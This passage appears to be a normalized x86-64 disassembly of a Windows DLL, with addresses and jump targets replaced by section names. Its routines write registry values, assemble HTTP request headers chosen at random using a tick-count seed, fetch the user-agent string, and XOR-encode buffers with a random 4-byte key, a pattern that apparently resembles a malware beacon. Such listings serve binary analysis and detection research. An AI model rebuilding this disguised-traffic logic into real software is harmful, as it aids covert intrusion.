lea rax [ rbp - 0x29 ]
mov [ rsp + 0x20 ] rax
mov r9d 0x4
xor r8d r8d
call [ RegSetValueExW@IAT ]
mov rcx [ rbp - 0x21 ]
test eax eax
je r-xdata
call [ RegCloseKey@IAT ]
nop
cmp [ rbp + 0x17 ] 0x8
jb r-xdata
mov [ rbp + 0x17 ] 0x7
mov [ rbp + 0xf ] rdi
mov [ rbp - 0x1 ] di
cmp [ rbp + 0x3f ] 0x8
jb r-xdata
mov rcx [ rbp - 0x1 ]
call j_sub_18002094c#2
call [ RegCloseKey@IAT ]
nop
cmp [ rbp + 0x17 ] 0x8
jb r-xdata
call [ RegCloseKey@IAT ]
nop
cmp [ rbp + 0x17 ] 0x8
jb r-xdata
mov [ rbp + 0x17 ] 0x7
mov [ rbp + 0xf ] rdi
mov [ rbp - 0x1 ] di
jmp r-xdata
mov rcx [ rbp - 0x1 ]
call j_sub_18002094c#2
mov rcx [ rbp + 0x27 ]
call j_sub_18002094c#2
xor al al
jmp r-xdata
mov [ rbp + 0x17 ] 0x7
mov [ rbp + 0xf ] rdi
mov [ rbp - 0x1 ] di
mov rcx [ rbp - 0x1 ]
call j_sub_18002094c#2
mov [ rbp + 0x17 ] 0x7
mov [ rbp + 0xf ] rdi
mov [ rbp - 0x1 ] di
cmp [ rbp + 0x3f ] 0x8
jb r-xdata
mov rcx [ rbp - 0x1 ]
call j_sub_18002094c#2
cmp [ rbp + 0x3f ] 0x8
jb r-xdata
mov al 0x1
mov rcx [ rbp + 0x27 ]
call j_sub_18002094c#2
mov rcx [ rbp + 0x27 ]
call j_sub_18002094c#2
xor al al
jmp r-xdata
sub_180015690
mov [ rsp + 0x18 ] r8
mov [ rsp + 0x10 ] rdx
mov [ rsp + 0x8 ] rcx
push rbx
push rsi
push rdi
push r12
push r13
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov rax r8
mov rbx rcx
sub rax rdx
mov rdi [ rcx + 0x10 ]
cmp rdi rax
ja r-xdata
xor esi esi
cmp [ rcx + 0x18 ] rax
je r-xdata
add rsp 0x30
pop r13
pop r12
pop rdi
pop rsi
pop rbx
retn
movsx r12d [ rdx ]
mov r8 [ rbx + 0x10 ]
or rax 0xffffffffffffffff
sub rax r8
cmp rax 0x1
ja r-xdata
mov r8b 0x1
mov rdx rax
call sub_180001850
test al al
je r-xdata
lea rdi [ r8 + 0x1 ]
cmp rdi r13
jbe r-xdata
lea rcx [ r--data ]
call sub_18001f6b8
mov [ rbx + 0x10 ] rdi
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
mov rax [ rbx + 0x18 ]
cmp rax rdi
jae r-xdata
lea rcx [ r--data ]
call sub_18001f6b8
mov rax rbx
mov rax [ rbx ]
jmp r-xdata
test rdi rdi
jne r-xdata
mov rdx rdi
mov rcx rbx
call sub_180001300
jmp r-xdata
mov r13 0x7ffffffffffffffe
nop [ rax + rax ] ax
xor esi esi
mov [ rax + rdi * 2 ] si
jmp r-xdata
mov rcx [ rbx + 0x10 ]
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
mov [ rbx + 0x10 ] rsi
cmp rax 0x8
jb r-xdata
test rdi rdi
je r-xdata
mov rax rbx
mov rax [ rbx ]
jmp r-xdata
mov rax rbx
mov rax [ rbx ]
jmp r-xdata
inc [ rsp + 0x68 ]
jmp r-xdata
mov rax rbx
mov rax [ rbx ]
jmp r-xdata
mov [ rax + rcx * 2 ] r12w
mov [ rbx + 0x10 ] rdi
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
mov [ rax ] si
jmp r-xdata
mov rdx [ rsp + 0x68 ]
cmp rdx [ rsp + 0x70 ]
je r-xdata
mov [ rax + rdi * 2 ] si
sub_1800157e0
push rbx
sub rsp 0x30
mov rax r8
mov rbx rcx
mov r8 rdx
xor r9d r9d
xor edx edx
mov rcx rax
mov [ rsp + 0x40 ] 0x0
mov [ rsp + 0x20 ] 0xffffffffffffffff
call sub_180007c20
mov [ rbx + 0x18 ] 0xf
mov [ rbx + 0x10 ] 0x0
mov rcx rbx
mov rdx rax
mov [ rbx ] 0x0
call sub_1800083f0
mov rax rbx
add rsp 0x30
pop rbx
retn
sub_180015840
mov rax rsp
push rbp
push rdi
push r12
lea rbp [ rax - 0x5f ]
sub rsp 0xe0
mov [ rbp - 0x69 ] 0xfffffffffffffffe
mov [ rax + 0x8 ] rbx
mov [ rax + 0x18 ] rsi
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x3f ] rax
mov rdi rdx
mov ecx 0x30
call sub_180021000
mov [ rbp - 0x71 ] rax
xor r12d r12d
test rax rax
je r-xdata
mov rbx r12
mov rcx rax
call sub_180017520
mov rbx rax
jmp r-xdata
mov r9d 0x20000000
or r8d 0xffffffff
mov rdx rax
mov rcx rdi
call [ HttpAddRequestHeadersW@IAT ]
cmp [ rbp - 0x49 ] 0x8
jb r-xdata
mov rax [ rax ]
mov r8d 0xb
lea rdx [ rw-data ]
mov rcx rbx
call sub_1800175a0
mov r8d 0x8c
lea rdx [ rw-data ]
mov rcx rbx
call sub_180017590
lea rdx [ rbp - 0x61 ]
mov rcx rbx
call sub_180017bc0
cmp [ rax + 0x18 ] 0x8
jb r-xdata
mov r8d 0x40
lea rdx [ rw-data ]
mov rcx rbx
call sub_180017590
lea rdx [ rbp - 0x61 ]
mov rcx rbx
call sub_180017bc0
cmp [ rax + 0x18 ] 0x8
jb r-xdata
mov rcx [ rbp - 0x61 ]
call j_sub_18002094c#2
mov r9d 0x20000000
or r8d 0xffffffff
mov rdx rax
mov rcx rdi
call [ HttpAddRequestHeadersW@IAT ]
cmp [ rbp - 0x49 ] 0x8
jb r-xdata
mov rax [ rax ]
mov r8d 0x3e
lea rdx [ rw-data ]
mov rcx rbx
call sub_180017590
lea rdx [ rbp - 0x61 ]
mov rcx rbx
call sub_180017bc0
cmp [ rax + 0x18 ] 0x8
jb r-xdata
mov rcx [ rbp - 0x61 ]
call j_sub_18002094c#2
mov r9d 0x20000000
or r8d 0xffffffff
mov rdx rax
mov rcx rdi
call [ HttpAddRequestHeadersW@IAT ]
cmp [ rbp - 0x49 ] 0x8
jb r-xdata
mov rax [ rax ]
mov eax [ rw-data ]
mov [ rbp - 0x75 ] eax
mov ecx eax
mov edx 0x1
call sub_180021308
mov rsi rax
lea r8 [ rbp - 0x75 ]
mov rdx rax
xor ecx ecx
call ObtainUserAgentString
mov rcx rbx
test eax eax
je r-xdata
mov rcx [ rbp - 0x61 ]
call j_sub_18002094c#2
mov r8d 0xd
lea rdx [ rw-data ]
call sub_180017590
mov r8d [ rbp - 0x75 ]
mov [ rbp - 0x21 ] 0xf
mov [ rbp - 0x29 ] r12
mov [ rbp - 0x39 ] 0x0
mov rdx rsi
lea rcx [ rbp - 0x39 ]
call sub_180008110
nop
lea rdx [ rbp - 0x61 ]
mov rcx rbx
call sub_180017d20
nop
lea r8 [ rbp - 0x39 ]
mov rdx rax
lea rcx [ rbp + 0x17 ]
call sub_1800088d0
nop
cmp [ rbp - 0x49 ] 0x10
jb r-xdata
mov r8d 0xa8
lea rdx [ rw-data ]
call sub_180017590
lea rdx [ rbp - 0x61 ]
mov rcx rbx
call sub_180017bc0
cmp [ rax + 0x18 ] 0x8
jb r-xdata
mov [ rbp - 0x49 ] 0xf
mov [ rbp - 0x51 ] r12
mov [ rbp - 0x61 ] 0x0
cmp [ rbp - 0x21 ] 0x10
jb r-xdata
mov rcx [ rbp - 0x61 ]
call j_sub_18002094c#2
mov r9d 0x20000000
or r8d 0xffffffff
mov rdx rax
mov rcx rdi
call [ HttpAddRequestHeadersW@IAT ]
cmp [ rbp - 0x49 ] 0x8
jb r-xdata
mov rax [ rax ]
mov [ rbp - 0x21 ] 0xf
mov [ rbp - 0x29 ] r12
mov [ rbp - 0x39 ] 0x0
lea r8 [ rbp + 0x17 ]
mov r9 [ rbp + 0x17 ]
mov rcx [ rbp + 0x2f ]
cmp rcx 0x10
cmovae r8 r9
add r8 [ rbp + 0x27 ]
lea rdx [ rbp + 0x17 ]
cmp rcx 0x10
cmovae rdx r9
mov [ rbp + 0x7 ] 0x7
mov [ rbp - 0x1 ] r12
mov [ rbp - 0x11 ] r12w
movzx r9d [ rbp - 0x79 ]
lea rcx [ rbp - 0x11 ]
call sub_180015690
lea rdx [ rbp - 0x11 ]
cmp [ rbp + 0x7 ] 0x8
cmovae rdx [ rbp - 0x11 ]
mov r9d 0x20000000
or r8d 0xffffffff
mov rcx rdi
call [ HttpAddRequestHeadersW@IAT ]
cmp [ rbp + 0x7 ] 0x8
jb r-xdata
mov rcx [ rbp - 0x39 ]
call j_sub_18002094c#2
mov rcx rsi
call sub_18002094c
test rbx rbx
je r-xdata
mov rcx [ rbp - 0x61 ]
jmp r-xdata
cmp [ rbp + 0x2f ] 0x10
jb r-xdata
mov rcx [ rbp - 0x11 ]
call j_sub_18002094c#2
nop
mov rcx [ rbp + 0x3f ]
xor rcx rsp
call sub_1800212e0
lea r11 [ rsp + 0xe0 ]
mov rbx [ r11 + 0x20 ]
mov rsi [ r11 + 0x30 ]
mov rsp r11
pop r12
pop rdi
pop rbp
retn
mov rcx rbx
call sub_180017560
mov rcx rbx
call j_sub_18002094c#2
call j_sub_18002094c#2
mov rcx [ rbp + 0x17 ]
sub_180015b80
push rsi
push rdi
push r12
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x50 ] rbx
mov [ rsp + 0x60 ] rbp
mov ebx r9d
mov rsi r8
mov rbp rdx
mov [ rsp + 0x68 ] 0x0
mov ecx 0x30
call sub_180021000
mov [ rsp + 0x28 ] rax
test rax rax
je r-xdata
xor edi edi
mov rcx rax
call sub_180017520
mov rdi rax
jmp r-xdata
mov rdi [ rsp + 0x58 ]
lea ecx [ rdi + 0x1 ]
mov ebx ecx
mov edx 0x1
call sub_180021308
mov rsi rax
mov r9 rdi
mov r8 r12
mov edx ebx
mov rcx rax
call sub_18002134c
mov rcx r12
call sub_18002094c
mov [ rbp + 0x18 ] 0xf
mov [ rbp + 0x10 ] 0x0
mov [ rbp ] 0x0
xor eax eax
or rcx 0xffffffffffffffff
mov rdi rsi
[ rdi ]
not rcx
lea r8 [ rcx - 0x1 ]
mov rdx rsi
mov rcx rbp
call sub_180008110
mov rcx rsi
call sub_18002094c
mov rax rbp
mov rbx [ rsp + 0x50 ]
mov rbp [ rsp + 0x60 ]
add rsp 0x30
pop r12
pop rdi
pop rsi
retn
mov rcx rdi
call sub_180017560
mov rcx rdi
call j_sub_18002094c#2
mov r8 rbx
lea r9 [ rsp + 0x58 ]
mov rdx rsi
mov rcx rdi
call sub_180017ae0
mov r12 rax
test rdi rdi
je r-xdata
sub_180015c80
mov [ rsp + 0x10 ] rbp
push rsi
push rdi
push r12
push r13
push r14
sub rsp 0x20
mov edi r8d
xor r14d r14d
mov rsi rdx
mov r13 rcx
lea rcx [ rdi + 0x1 ]
lea edx [ r14 + 0x1 ]
mov [ rsp + 0x60 ] r14d
mov r12d r8d
call sub_180021308
mov rbp rax
test edi edi
je r-xdata
or rcx 0xffffffffffffffff
mov [ rsi + 0x18 ] 0xf
mov [ rsi + 0x10 ] r14
xor eax eax
mov [ rsi ] r14b
mov rdi rbp
[ rdi ]
mov rdx rbp
not rcx
lea r8 [ rcx - 0x1 ]
mov rcx rsi
call sub_180008110
mov rcx rbp
call sub_18002094c
mov rbp [ rsp + 0x58 ]
mov rax rsi
add rsp 0x20
pop r14
pop r13
pop r12
pop rdi
pop rsi
retn
mov [ rsp + 0x50 ] rbx
mov rbx rax
mov [ rsp + 0x60 ] r14d
call [ GetTickCount@IAT ]
mov edi eax
call sub_180021a90
lea ecx [ rax + rdi ]
call sub_180021a78
lea rcx [ rsp + 0x60 ]
call sub_180021974
mov edx [ rsp + 0x60 ]
inc rbx
and edx 0x3f
dec r12
movsxd rax edx
mov [ rsp + 0x60 ] edx
movzx ecx [ rax + r13 + 0x6d ]
mov [ rbx - 0x1 ] cl
jne r-xdata
mov rbx [ rsp + 0x50 ]
sub_180015d60
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
lea rbp [ rsp - 0x80 ]
sub rsp 0x180
mov [ rsp + 0x50 ] 0xfffffffffffffffe
mov [ rsp + 0x1d8 ] rbx
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x78 ] rax
mov r13 r8
mov r15 rdx
mov [ rsp + 0x40 ] rcx
mov [ rsp + 0x48 ] rdx
mov [ rsp + 0x58 ] r8
xor r14d r14d
mov [ rsp + 0x28 ] r14d
lea ecx [ r14 + 0x30 ]
call sub_180021000
mov [ rsp + 0x30 ] rax
test rax rax
je r-xdata
mov rdi r14
mov rcx rax
call sub_180017520
mov rdi rax
jmp r-xdata
mov r8 r13
lea rdx [ rbp - 0x50 ]
lea rcx [ rbp + 0x50 ]
call sub_18000f740
nop
or r9 0xffffffffffffffff
xor r8d r8d
mov rdx rax
mov rcx r15
call sub_180007b00
nop
cmp [ rbp + 0x68 ] 0x10
jb r-xdata
mov [ rsp + 0x30 ] rax
lea rsi [ rw-data ]
nop [ rax + rax ] ax
mov [ rsp + 0x38 ] rdi
mov r8d 0xb
lea rdx [ rw-data ]
mov rcx rdi
call sub_1800175a0
mov [ rsp + 0x20 ] r14d
call [ GetTickCount@IAT ]
mov ebx eax
call sub_180021a90
lea ecx [ rax + rbx ]
call sub_180021a78
lea rcx [ rsp + 0x20 ]
call sub_180021974
mov r11d [ rsp + 0x20 ]
mov eax 0x24924925
mul r11d
mov eax r11d
sub eax edx
shr eax 0x1
add eax edx
shr eax 0x2
imul eax eax 0x7
sub r11d eax
movsxd rax r11d
lea rcx [ rax + rax * 4 ]
lea rax [ rw-data ]
lea rdx [ rax + rcx * 4 ]
mov r8d 0x14
mov rcx rdi
call sub_180017590
lea rdx [ rbp + 0x28 ]
mov rcx rdi
call sub_180017d20
nop
mov [ r15 + 0x18 ] 0xf
mov [ r15 + 0x10 ] r14
mov [ r15 ] 0x0
or r9 0xffffffffffffffff
xor r8d r8d
lea rdx [ rbp + 0x28 ]
mov rcx r15
call sub_180008000
mov [ rsp + 0x28 ] 0x1
mov r8d 0x6
lea rdx [ rw-data ]
mov rcx rdi
call sub_180017590
lea rdx [ rbp - 0x50 ]
mov rcx rdi
call sub_180017d20
nop
mov [ rsp + 0x24 ] 0x0
mov [ rsp + 0x20 ] r14d
call [ GetTickCount@IAT ]
mov ebx eax
call sub_180021a90
lea ecx [ rax + rbx ]
call sub_180021a78
lea rcx [ rsp + 0x20 ]
call sub_180021974
mov r11d [ rsp + 0x20 ]
mov eax 0x38e38e39
mul r11d
shr edx 0x1
lea eax [ rdx + rdx * 8 ]
sub r11d eax
add r11d 0x2
movzx eax r11b
dec eax
test eax eax
jle r-xdata
mov rbx [ rsp + 0x38 ]
test rbx rbx
je r-xdata
mov rcx [ rbp + 0x50 ]
test ecx ecx
sete al
test al al
je r-xdata
cmp rdi rbx
jae r-xdata
cmp [ rbp - 0x38 ] 0x10
jb r-xdata
mov rcx rbx
call sub_180017560
mov rcx rbx
call j_sub_18002094c#2
nop
lea rdx [ rbp - 0x50 ]
cmp [ rbp - 0x38 ] 0x10
cmovae rdx [ rbp - 0x50 ]
lea rcx [ rsp + 0x60 ]
cmp rsi 0x10
cmovae rcx r12
mov r8 r14
call sub_180021520
movsxd rcx eax
test eax eax
je r-xdata
cmp [ rsp + 0x24 ] 0x0
jne r-xdata
xor eax eax
cmp rdi rbx
setne al
mov ecx eax
or ecx 0xffffffff
jmp r-xdata
mov [ rbp - 0x38 ] 0xf
mov [ rbp - 0x40 ] r14
mov [ rbp - 0x50 ] 0x0
cmp [ rbp + 0x40 ] 0x10
jb r-xdata
mov rcx [ rbp - 0x50 ]
call j_sub_18002094c#2
cmp rdi rbx
jae r-xdata
xor r14d r14d
jmp r-xdata
mov bl 0x1
mov [ rsp + 0x24 ] bl
mov r8 r13
lea rdx [ rsp + 0x60 ]
lea rcx [ rbp ]
call sub_18000f740
nop
lea r8 [ rw-data ]
mov rdx rax
lea rcx [ rbp - 0x78 ]
call sub_18000f7f0
nop
or r9 0xffffffffffffffff
xor r8d r8d
mov rdx rax
mov rcx r15
call sub_180007b00
nop
cmp [ rbp - 0x60 ] 0x10
jb r-xdata
mov [ rbp + 0x40 ] 0xf
mov [ rbp + 0x38 ] r14
mov [ rbp + 0x28 ] 0x0
cmp [ r13 + 0x18 ] 0x10
jb r-xdata
mov rcx [ rbp + 0x28 ]
call j_sub_18002094c#2
xor r14d r14d
mov eax r14d
cmp rdi rbx
setne al
mov ecx eax
or ecx 0xffffffff
xor r14d r14d
jmp r-xdata
test ecx ecx
sete al
test al al
sete al
test al al
je r-xdata
mov [ rbp - 0x60 ] 0xf
xor r14d r14d
mov [ rbp - 0x68 ] r14
mov [ rbp - 0x78 ] r14b
cmp [ rbp + 0x18 ] 0x10
jb r-xdata
mov rcx [ rbp - 0x78 ]
call j_sub_18002094c#2
mov [ r13 + 0x18 ] 0xf
mov [ r13 + 0x10 ] r14
mov [ r13 ] 0x0
mov rax r15
mov rcx [ rbp + 0x78 ]
xor rcx rsp
call sub_1800212e0
mov rbx [ rsp + 0x1d8 ]
add rsp 0x180
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
mov rcx [ r13 ]
call j_sub_18002094c#2
cmp rsi 0x10
jb r-xdata
mov [ rsp + 0x20 ] r14d
call [ GetTickCount@IAT ]
mov ebx eax
call sub_180021a90
add ebx eax
mov ecx ebx
call sub_180021a78
lea rcx [ rsp + 0x20 ]
call sub_180021974
mov eax 0x4ec4ec4f
mov r8d [ rsp + 0x20 ]
mul r8d
shr edx 0x2
imul edx edx 0xd
mov eax 0x1
sub eax edx
add r8d eax
mov [ rsp + 0x20 ] r8d
lea rdx [ rbp ]
mov rcx [ rsp + 0x40 ]
call sub_180015c80
nop
mov r8 rax
lea rdx [ rsp + 0x60 ]
lea rcx [ rbp - 0x28 ]
call sub_1800157e0
nop
lea r8 [ rw-data ]
mov rdx rax
lea rcx [ rbp - 0x78 ]
call sub_18000f7f0
nop
or r9 0xffffffffffffffff
xor r8d r8d
mov rdx rax
mov rcx r15
call sub_180007b00
nop
cmp [ rbp - 0x60 ] 0x10
jb r-xdata
cmp [ rsp + 0x78 ] 0x10
jb r-xdata
mov rcx [ rbp ]
call j_sub_18002094c#2
nop
movzx ebx [ rsp + 0x24 ]
mov rcx r12
call j_sub_18002094c#2
mov [ rbp - 0x60 ] 0xf
mov [ rbp - 0x68 ] r14
mov [ rbp - 0x78 ] 0x0
cmp [ rbp - 0x10 ] 0x10
jb r-xdata
mov rcx [ rbp - 0x78 ]
call j_sub_18002094c#2
dec [ rsp + 0x30 ]
mov rdi [ rsp + 0x38 ]
lea rsi [ rw-data ]
jne r-xdata
mov rcx [ rsp + 0x60 ]
call j_sub_18002094c#2
jmp r-xdata
mov [ rsp + 0x20 ] r14d
call [ GetTickCount@IAT ]
mov ebx eax
call sub_180021a90
lea ecx [ rax + rbx ]
call sub_180021a78
lea rcx [ rsp + 0x20 ]
call sub_180021974
mov r11d [ rsp + 0x20 ]
mov eax 0xba2e8ba3
mul r11d
shr edx 0x3
imul edx edx 0xb
sub r11d edx
mov edx r11d
imul rdx rdx 0xf
add rdx rsi
mov r8d 0xf
mov rcx rdi
call sub_180017590
lea rdx [ rsp + 0x60 ]
mov rcx rdi
call sub_180017d20
nop
lea rdx [ rbp - 0x50 ]
cmp [ rbp - 0x38 ] 0x10
cmovae rdx [ rbp - 0x50 ]
lea rcx [ rsp + 0x60 ]
mov r12 [ rsp + 0x60 ]
mov rsi [ rsp + 0x78 ]
cmp rsi 0x10
cmovae rcx r12
mov rbx [ rbp - 0x40 ]
mov r14 rbx
mov rdi [ rsp + 0x70 ]
cmp rdi rbx
cmovb r14 rdi
mov r8 r14
call sub_180021520
movsxd rcx eax
test eax eax
jne r-xdata
test bl bl
je r-xdata
mov [ rbp - 0x10 ] 0xf
mov [ rbp - 0x18 ] r14
mov [ rbp - 0x28 ] 0x0
cmp [ rbp + 0x18 ] 0x10
jb r-xdata
mov rcx [ rbp - 0x28 ]
call j_sub_18002094c#2
mov [ rsp + 0x78 ] 0xf
mov [ rsp + 0x70 ] r14
mov [ rsp + 0x60 ] 0x0
mov edi 0x1
mov r8d edi
lea rdx [ r--data ]
lea rcx [ rsp + 0x60 ]
call sub_180008110
nop
mov [ rsp + 0x20 ] r14d
call [ GetTickCount@IAT ]
mov ebx eax
call sub_180021a90
lea ecx [ rax + rbx ]
call sub_180021a78
lea rcx [ rsp + 0x20 ]
call sub_180021974
mov eax 0xaaaaaaab
mov r8d [ rsp + 0x20 ]
mul r8d
shr edx 0x1
lea eax [ rdx + rdx * 2 ]
mov ecx 0x3
sub ecx eax
add r8d ecx
mov [ rsp + 0x20 ] r8d
lea rdx [ rbp - 0x28 ]
mov rsi [ rsp + 0x40 ]
mov rcx rsi
call sub_180015c80
nop
lea r8 [ rsp + 0x60 ]
mov rdx rax
lea rcx [ rbp ]
call sub_1800088d0
nop
cmp [ rbp - 0x10 ] 0x10
jb r-xdata
mov r12 [ rsp + 0x60 ]
mov rsi [ rsp + 0x78 ]
mov rcx [ rbp ]
call j_sub_18002094c#2
mov [ rbp - 0x10 ] 0xf
mov [ rbp - 0x18 ] r14
mov [ rbp - 0x28 ] 0x0
cmp [ rsp + 0x78 ] 0x10
jb r-xdata
mov rcx [ rbp - 0x28 ]
call j_sub_18002094c#2
mov [ rsp + 0x78 ] 0xf
mov [ rsp + 0x70 ] r14
mov [ rsp + 0x60 ] 0x0
mov [ rsp + 0x20 ] r14d
call [ GetTickCount@IAT ]
mov ebx eax
call sub_180021a90
lea ecx [ rax + rbx ]
call sub_180021a78
lea rcx [ rsp + 0x20 ]
call sub_180021974
mov eax 0x4ec4ec4f
mov r8d [ rsp + 0x20 ]
mul r8d
shr edx 0x2
imul edx edx 0xd
sub edi edx
add r8d edi
mov [ rsp + 0x20 ] r8d
lea rdx [ rbp + 0x50 ]
mov rcx rsi
call sub_180015c80
nop
mov r8 rax
lea rdx [ rbp ]
lea rcx [ rbp - 0x78 ]
call sub_1800157e0
nop
or r9 0xffffffffffffffff
xor r8d r8d
mov rdx rax
mov rcx r15
call sub_180007b00
nop
cmp [ rbp - 0x60 ] 0x10
jb r-xdata
mov rcx [ rsp + 0x60 ]
call j_sub_18002094c#2
mov [ rbp - 0x60 ] 0xf
mov [ rbp - 0x68 ] r14
mov [ rbp - 0x78 ] 0x0
cmp [ rbp + 0x68 ] 0x10
jb r-xdata
mov rcx [ rbp - 0x78 ]
call j_sub_18002094c#2
cmp [ rbp + 0x18 ] 0x10
jb r-xdata
mov rcx [ rbp + 0x50 ]
call j_sub_18002094c#2
nop
mov rcx [ rbp ]
jmp r-xdata
call j_sub_18002094c#2
sub_180016450
push rbx
push rbp
push rsi
push rdi
push r12
sub rsp 0x70
mov [ rsp + 0x28 ] 0xfffffffffffffffe
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x60 ] rax
mov r12 r9
mov esi r8d
mov rdi rdx
mov rbp rcx
xor ebx ebx
mov [ rsp + 0x20 ] rbx
lea ecx [ rbx + 0x30 ]
call sub_180021000
mov [ rsp + 0x30 ] rax
test rax rax
je r-xdata
mov r8 rsi
lea r9 [ rsp + 0x20 ]
mov rdx rdi
mov rcx rbx
call sub_180017ae0
mov rsi rax
test rbx rbx
je r-xdata
mov rcx rax
call sub_180017520
mov rbx rax
mov r8d [ rw-data ]
lea rdx [ rsp + 0x38 ]
mov rcx rbp
call sub_180015c80
mov rdi [ rsp + 0x48 ]
mov eax [ rsp + 0x20 ]
lea ecx [ rdi + rax ]
mov [ r12 ] ecx
mov edx 0x1
call sub_180021308
mov rbx rax
test rax rax
jne r-xdata
mov rcx rbx
call sub_180017560
mov rcx rbx
call j_sub_18002094c#2
lea r8 [ rsp + 0x38 ]
cmp [ rsp + 0x50 ] 0x10
cmovae r8 [ rsp + 0x38 ]
mov r9 rdi
mov rdx rdi
mov rcx rax
call sub_18002134c
mov rcx [ rsp + 0x48 ]
add rcx rbx
mov rdx [ rsp + 0x20 ]
mov r9 rdx
mov r8 rsi
call sub_18002134c
mov rcx rsi
call sub_18002094c
cmp [ rsp + 0x50 ] 0x10
jb r-xdata
cmp [ rsp + 0x50 ] 0x10
jb r-xdata
mov rax rbx
mov rcx [ rsp + 0x38 ]
call j_sub_18002094c#2
xor eax eax
jmp r-xdata
mov rcx [ rsp + 0x38 ]
call j_sub_18002094c#2
mov rcx [ rsp + 0x60 ]
xor rcx rsp
call sub_1800212e0
add rsp 0x70
pop r12
pop rdi
pop rsi
pop rbp
pop rbx
retn
sub_180016590
mov r11 rsp
push rsi
push rdi
push r12
sub rsp 0x90
mov [ rsp + 0x28 ] 0xfffffffffffffffe
mov [ r11 + 0x18 ] rbx
mov [ r11 + 0x20 ] rbp
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x88 ] rax
mov edi r8d
mov rsi rdx
mov rbp rcx
mov [ r11 - 0x78 ] rdx
xor r12d r12d
mov [ rsp + 0x24 ] r12d
mov [ rsp + 0x20 ] r12d
call [ GetTickCount@IAT ]
mov ebx eax
call sub_180021a90
lea ecx [ rax + rbx ]
call sub_180021a78
lea rcx [ rsp + 0x20 ]
call sub_180021974
xor edx edx
mov ecx [ rsp + 0x20 ]
mov eax ecx
or r8d 0xffffffff
div r8d
add ecx eax
mov rax [ rbp + 0x30 ]
mov [ rax ] ecx
mov rcx [ rbp + 0x30 ]
add rcx 0x4
mov r9d 0x7
lea r8 [ rw-data ]
mov edx r9d
call sub_18002134c
mov r11 [ rbp + 0x30 ]
mov [ r11 + 0xb ] edi
xor r8b r8b
cmp [ rbp + 0x38 ] 0x4
je r-xdata
mov r9d [ rbp + 0x38 ]
mov r8 [ rbp + 0x30 ]
mov rdx rsi
mov rcx rbp
call sub_180015b80
mov [ rsp + 0x24 ] 0x1
mov r8d [ rw-data ]
lea rdx [ rsp + 0x60 ]
mov rcx rbp
call sub_180015c80
nop
mov r8 rsi
mov rdx rax
lea rcx [ rsp + 0x38 ]
call sub_18000f7f0
mov rbx rax
cmp rsi rax
je r-xdata
mov edx r12d
nop [ rax + rax ] ax
cmp [ rsp + 0x50 ] 0x10
jb r-xdata
cmp [ rsi + 0x18 ] 0x10
jb r-xdata
mov rax [ rbp + 0x30 ]
lea rcx [ rax + rdx + 0x4 ]
and edx 0x3
movzx eax [ rdx + rax ]
xor [ rcx ] al
inc r8b
movzx edx r8b
mov eax [ rbp + 0x38 ]
sub rax 0x4
cmp rdx rax
jb r-xdata
mov [ rsp + 0x50 ] 0xf
mov [ rsp + 0x48 ] r12
mov [ rsp + 0x38 ] 0x0
cmp [ rsp + 0x78 ] 0x10
jb r-xdata
mov rcx [ rsp + 0x38 ]
call j_sub_18002094c#2
mov [ rsi + 0x18 ] 0xf
mov [ rsi + 0x10 ] r12
mov [ rsi ] 0x0
cmp [ rbx + 0x18 ] 0x10
jae r-xdata
mov rcx [ rsi ]
call j_sub_18002094c#2
mov rax rsi
mov rcx [ rsp + 0x88 ]
xor rcx rsp
call sub_1800212e0
lea r11 [ rsp + 0x90 ]
mov rbx [ r11 + 0x30 ]
mov rbp [ r11 + 0x38 ]
mov rsp r11
pop r12
pop rdi
pop rsi
retn
mov rcx [ rsp + 0x60 ]
call j_sub_18002094c#2
mov rax [ rbx ]
mov [ rsi ] rax
mov [ rbx ] r12
mov r8 [ rbx + 0x10 ]
inc r8
mov rdx rbx
mov rcx rsi
call sub_1800205e0
jmp r-xdata
mov rax [ rbx + 0x10 ]
mov [ rsi + 0x10 ] rax
mov rax [ rbx + 0x18 ]
mov [ rsi + 0x18 ] rax
mov [ rbx + 0x10 ] r12
mov [ rbx + 0x18 ] r12
sub_180016780
mov [ rsp + 0x10 ] rbp
push rsi
push rdi
push r12
push r13
push r14
sub rsp 0x20
mov ebp r8d
mov r14 rdx
mov r13 rcx
lea esi [ rbp + 0xb ]
mov edx 0x1
mov r12 r9
mov ecx esi
call sub_180021308
mov rdi rax
test rax rax
jne r-xdata
mov [ rsp + 0x50 ] rbx
mov [ rsp + 0x60 ] 0x0
call [ GetTickCount@IAT ]
mov ebx eax
call sub_180021a90
lea ecx [ rax + rbx ]
call sub_180021a78
lea rcx [ rsp + 0x60 ]
call sub_180021974
mov ecx [ rsp + 0x60 ]
xor edx edx
or r8d 0xffffffff
mov eax ecx
mov r9d 0x7
div r8d
lea rbx [ rdi + 0x4 ]
lea r8 [ rw-data ]
add eax ecx
mov rcx rbx
mov edx r9d
mov [ rdi ] eax
call sub_18002134c
lea rcx [ rdi + 0xb ]
mov rdx rbp
mov r9 rbp
mov r8 r14
call sub_18002134c
mov rdx 0xfffffffffffffffc
mov ecx 0xb
sub rdx rdi
mov rbp [ rsp + 0x58 ]
add rsp 0x20
pop r14
pop r13
pop r12
pop rdi
pop rsi
retn
lea rax [ rdx + rbx ]
inc rbx
and eax 0x3
movzx eax [ rax + rdi ]
xor [ rbx - 0x1 ] al
dec rcx
jne r-xdata
mov r9 r12
mov r8d esi
mov rdx rdi
mov rcx r13
call sub_180016450
mov rcx rdi
mov rbx rax
call sub_18002094c
mov rbp [ rsp + 0x58 ]
mov rax rbx
mov rbx [ rsp + 0x50 ]
add rsp 0x20
pop r14
pop r13
pop r12
pop rdi
pop rsi
retn
sub_180016890
push rdi
sub rsp 0x90
mov [ rsp + 0x28 ] 0xfffffffffffffffe
mov [ rsp + 0xb0 ] rbx
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x80 ] rax
mov rdi rdx
mov rbx rcx
mov [ rsp + 0x20 ] 0x0
lea rdx [ rsp + 0x58 ]
call sub_180016590
nop
